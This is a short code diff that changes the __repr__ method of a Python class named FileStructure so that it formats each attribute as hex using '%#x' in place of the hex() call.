@@ -176,7 +176,7 @@ class FileStructure(object):
     def __repr__(self):
         structure=[]
         for i in self.vars_:
-            structure.append(" %s: %s" % (i,hex(getattr(self, i))))
+            structure.append(" %s: %#x" % (i, getattr(self, i)))
         return "{"+ "\n".join(structure)+"}"
 
     def __len__(self):
